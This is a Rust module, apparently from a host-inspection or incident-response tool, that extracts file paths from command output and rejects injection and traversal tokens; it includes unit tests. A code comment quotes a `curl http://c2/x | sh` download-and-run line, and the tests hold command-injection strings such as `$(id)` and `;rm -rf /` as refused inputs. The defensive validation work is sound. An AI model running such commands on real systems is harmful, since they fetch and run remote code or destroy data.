//! Which absolute path a catalog command's own output line names.
//!
//! The extraction lives in the core because only the core knows what its own
//! fixed commands print. A caller names a line; it never names a path. A line
//! yields a path only when its shape says which file it is about, so an
//! offered action always points at the file the operator is looking at.

/// Upper bound on the paths one run can carry.
pub const MAX_COMMAND_PATHS: usize = 500;

/// Longest remote path an output line may name.
const MAX_PATH_BYTES: usize = 1_024;

/// Most fields a line may carry and still be read as `<status> <path>`.
///
/// `dpkg -V` prints two, `rpm -Va` three. A process listing prints more, and
/// there the last field is an argument rather than the subject of the line.
const MAX_STATUS_FIELDS: usize = 3;

/// Characters a recognised path may not contain.
///
/// None of these are illegal in a POSIX file name, but every one of them makes
/// a line ambiguous to read back, and a misread path is a wrong file to act on.
/// `:` is here because `grep -n` prints `path:line:text`.
const REJECTED: [char; 21] = [
    '`', '$', ';', '|', '&', '<', '>', '(', ')', '*', '?', '[', ']', '{', '}', '!', '"', '\'',
    '\\', ':', '=',
];

/// What a single output line says about a path.
#[derive(Debug, PartialEq, Eq)]
enum LineSubject<'a> {
    /// The line names a path outright.
    Absolute(&'a str),
    /// The line is a directory entry naming a file relative to a heading.
    Relative(&'a str),
    /// The line is the `/some/dir:` heading of a multi-directory listing.
    Heading(&'a str),
    /// The line says nothing about any one file.
    None,
}

/// The absolute path this line names on its own, if it names exactly one.
///
/// A line inside a multi-directory listing names its file relative to the
/// heading above it and so has no path of its own; use [`paths_in_output`],
/// which reads the headings.
pub fn path_in_line(line: &str) -> Option<&str> {
    match subject(line) {
        LineSubject::Absolute(path) => Some(path),
        _ => None,
    }
}

fn subject(line: &str) -> LineSubject<'_> {
    let line = line.trim_end();
    if line.is_empty() {
        return LineSubject::None;
    }
    // `ls` heads each directory of a multi-directory listing with its path.
    if let Some(heading) = line.strip_suffix(':')
        && !heading.contains(' ')
        && let Some(path) = accept(heading)
    {
        return LineSubject::Heading(path);
    }
    // A long listing renders a link as `<path> -> <target>`. The link itself
    // is the thing on the host, so the target after the arrow is not offered.
    let subject = match line.split_once(" -> ") {
        Some((left, _)) => left.trim_end(),
        None => line,
    };
    let fields: Vec<&str> = subject.split_ascii_whitespace().collect();
    let Some(last) = fields.last().copied() else {
        return LineSubject::None;
    };

    // A long listing states the mode first, and the name is what remains.
    if is_mode(fields[0]) && fields.len() > 1 {
        return match accept(last) {
            Some(path) => LineSubject::Absolute(path),
            // Inside `ls -la /a /b` the entries carry bare names.
            None if is_entry_name(last) => LineSubject::Relative(last),
            None => LineSubject::None,
        };
    }
    // A bare result, or a short `<status> <path>` verification line.
    if fields.len() <= MAX_STATUS_FIELDS
        && let Some(path) = accept(last)
    {
        return LineSubject::Absolute(path);
    }
    // `stat -c '%n ...'` states the file first and its attributes after.
    if fields.len() > 1
        && accept(last).is_none()
        && let Some(path) = accept(fields[0])
    {
        return LineSubject::Absolute(path);
    }
    LineSubject::None
}

/// Whether a field is the mode column of a long listing, such as `-rwsr-xr-x`
/// or `drwxrwxrwt.`.
fn is_mode(field: &str) -> bool {
    let field = field.trim_end_matches(['.', '+']);
    if field.len() != 10 {
        return false;
    }
    let mut characters = field.chars();
    let kind = characters.next().unwrap_or(' ');
    "-dlbcps".contains(kind) && characters.all(|bit| "rwxsStT-".contains(bit))
}

/// Whether a listing entry names a file rather than a step out of the
/// directory it is listed in.
fn is_entry_name(name: &str) -> bool {
    !name.is_empty()
        && name != "."
        && name != ".."
        && name.len() <= MAX_PATH_BYTES
        && !name.contains('/')
        && !name
            .chars()
            .any(|character| character.is_control() || REJECTED.contains(&character))
}

/// Whether a token read out of an output line is a path worth offering.
fn accept(candidate: &str) -> Option<&str> {
    // A trailing slash is how several listings mark a directory; the path
    // underneath is the same one.
    let candidate = match candidate.strip_suffix('/') {
        Some(trimmed) if !trimmed.is_empty() => trimmed,
        Some(_) => return None,
        None => candidate,
    };
    if !candidate.starts_with('/') || candidate.len() < 2 || candidate.len() > MAX_PATH_BYTES {
        return None;
    }
    if candidate
        .chars()
        .any(|character| character.is_control() || REJECTED.contains(&character))
    {
        return None;
    }
    // `//a` and `/a//b` are ways of writing a path this cannot resolve back to
    // one name; `.` and `..` are relative steps whose meaning depends on where
    // the path is read.
    if candidate.contains("//")
        || candidate
            .split('/')
            .any(|component| component == "." || component == "..")
    {
        return None;
    }
    Some(candidate)
}

/// Every line of `output` that names a path, as `(line index, path)`.
///
/// Bounded the same way the marks are, and reported in display order so a
/// caller can address a path by the line the operator clicked. Entries of a
/// multi-directory listing are joined to the heading they were printed under.
pub fn paths_in_output(output: &str) -> Vec<(u32, String)> {
    let mut found = Vec::new();
    let mut heading: Option<&str> = None;
    for (index, line) in output.lines().enumerate() {
        if found.len() >= MAX_COMMAND_PATHS {
            break;
        }
        let Ok(index) = u32::try_from(index) else {
            break;
        };
        let path = match subject(line) {
            LineSubject::Absolute(path) => path.to_owned(),
            LineSubject::Heading(path) => {
                heading = Some(path);
                continue;
            }
            LineSubject::Relative(name) => {
                let Some(directory) = heading else { continue };
                let joined = format!("{directory}/{name}");
                if joined.len() > MAX_PATH_BYTES {
                    continue;
                }
                joined
            }
            LineSubject::None => continue,
        };
        found.push((index, path));
    }
    found
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn reads_the_path_out_of_a_long_listing() {
        assert_eq!(
            path_in_line(
                "-rwsr-xr-x 1 root root 1234 Aug 25 23:36 /usr/local/lib/pyshared/.helper"
            ),
            Some("/usr/local/lib/pyshared/.helper"),
        );
    }

    #[test]
    fn reads_a_bare_find_result() {
        assert_eq!(
            path_in_line("/tmp/.hidden-payload"),
            Some("/tmp/.hidden-payload")
        );
    }

    #[test]
    fn reports_a_link_by_its_own_path_not_its_target() {
        assert_eq!(
            path_in_line("lrwxrwxrwx 1 root root 9 Aug 25 23:36 /etc/cron.d/backdoor -> /tmp/.x"),
            Some("/etc/cron.d/backdoor"),
        );
    }

    #[test]
    fn drops_the_marker_slash_a_directory_listing_adds() {
        assert_eq!(
            path_in_line("drwxrwxrwt 2 root root 40 Aug 25 /dev/shm/"),
            Some("/dev/shm")
        );
    }

    #[test]
    fn ignores_a_line_that_names_no_path() {
        assert_eq!(
            path_in_line("tcp LISTEN 0 128 0.0.0.0:4444 0.0.0.0:*"),
            None
        );
        assert_eq!(path_in_line(""), None);
        assert_eq!(path_in_line("   "), None);
        assert_eq!(path_in_line("root pts/0 2026-08-25 still logged in"), None);
    }

    #[test]
    fn refuses_a_grep_hit_because_the_line_number_is_glued_to_the_path() {
        // `/etc/profile:12:curl http://c2/x | sh` would otherwise be read as a
        // file named `/etc/profile:12:curl`.
        assert_eq!(path_in_line("/etc/profile:12:export PATH=/tmp:$PATH"), None);
    }

    #[test]
    fn refuses_a_token_that_would_be_read_back_wrongly() {
        for line in [
            "/tmp/$(id)",
            "/tmp/a;rm -rf /",
            "/tmp/a`id`",
            "/tmp/a|b",
            "/tmp/a*b",
            "/tmp//b",
            "/tmp/../etc/passwd",
            "/tmp/./x",
            "/",
            "//",
            "relative/path",
        ] {
            assert_eq!(path_in_line(line), None, "accepted {line}");
        }
    }

    #[test]
    fn refuses_a_path_longer_than_the_ceiling() {
        let long = format!("/{}", "a".repeat(MAX_PATH_BYTES));
        assert_eq!(path_in_line(&long), None);
    }

    #[test]
    fn keeps_the_punctuation_a_real_path_carries() {
        for line in [
            "/usr/lib/python3.11/site-packages/.hidden",
            "/opt/app-v1.2_final/run.sh",
            "/var/log/journal/@2026-08-25.log",
            "/srv/data/+staging/notes,old",
            "/usr/share/中文目录/木马",
        ] {
            assert_eq!(path_in_line(line), Some(line), "rejected {line}");
        }
    }

    #[test]
    fn addresses_each_path_by_the_line_it_was_printed_on() {
        let output =
            "total 12\n-rwsr-xr-x 1 root root 8 Aug 25 /tmp/.a\nnot a path here\n/tmp/.b\n";
        assert_eq!(
            paths_in_output(output),
            vec![(1, "/tmp/.a".to_owned()), (3, "/tmp/.b".to_owned())],
        );
    }

    #[test]
    fn stops_at_the_ceiling() {
        let output = (0..MAX_COMMAND_PATHS + 40)
            .map(|index| format!("/tmp/.f{index}"))
            .collect::<Vec<_>>()
            .join("\n");
        assert_eq!(paths_in_output(&output).len(), MAX_COMMAND_PATHS);
    }

    #[test]
    fn joins_a_listing_entry_to_the_directory_it_was_printed_under() {
        let output = concat!(
            "/etc/cron.d:
",
            "total 20
",
            "drwxr-xr-x 1 root root 4096 Aug 25 23:31 .
",
            "drwxr-xr-x 1 root root 4096 Aug 25 23:35 ..
",
            "-rw-r--r-- 1 root root  105 Aug 25 23:31 sysupdate
",
            "
",
            "/etc/cron.daily:
",
            "-rwxr-xr-x 1 root root   66 Aug 25 23:31 logrotate-helper
",
        );
        assert_eq!(
            paths_in_output(output),
            vec![
                (4, "/etc/cron.d/sysupdate".to_owned()),
                (7, "/etc/cron.daily/logrotate-helper".to_owned()),
            ],
        );
    }

    #[test]
    fn leaves_a_listing_entry_alone_when_no_directory_was_announced() {
        let output = "-rwxr-xr-x 1 root root 66 Aug 25 23:31 logrotate-helper
";
        assert!(paths_in_output(output).is_empty());
    }

    #[test]
    fn refuses_the_argument_of_a_process_line() {
        // The subject of this line is the running program, not the script it
        // was handed, so neither is offered.
        assert_eq!(
            path_in_line("root          84 ?        /bin/sh /opt/entrypoint.sh"),
            None
        );
        assert_eq!(
            path_in_line("root  80 ? /tmp/.deleted-payload -c sleep 86400"),
            None
        );
        assert_eq!(
            path_in_line("root 89 ? sshd: /usr/sbin/sshd -D -e [listener] 0 of 10-100 startups"),
            None,
        );
    }

    #[test]
    fn reads_a_verification_line_and_a_stat_line() {
        assert_eq!(
            path_in_line("missing     /usr/share/doc/bash/RBASH"),
            Some("/usr/share/doc/bash/RBASH"),
        );
        assert_eq!(
            path_in_line("??5?????? c /etc/bash.bashrc"),
            Some("/etc/bash.bashrc")
        );
        assert_eq!(
            path_in_line("/etc/shadow mtime=2026-08-25 uid=root mode=640"),
            Some("/etc/shadow"),
        );
    }

    #[test]
    fn recognises_the_mode_column_of_every_listing_style() {
        assert!(is_mode("-rwsr-xr-x"));
        assert!(is_mode("drwxrwxrwt"));
        assert!(is_mode("lrwxrwxrwx"));
        assert!(is_mode("-rw-r--r--."));
        assert!(is_mode("drwxr-xr-x+"));
        assert!(!is_mode("total"));
        assert!(!is_mode("-rwsr-xr-"));
        assert!(!is_mode("missing"));
    }
}
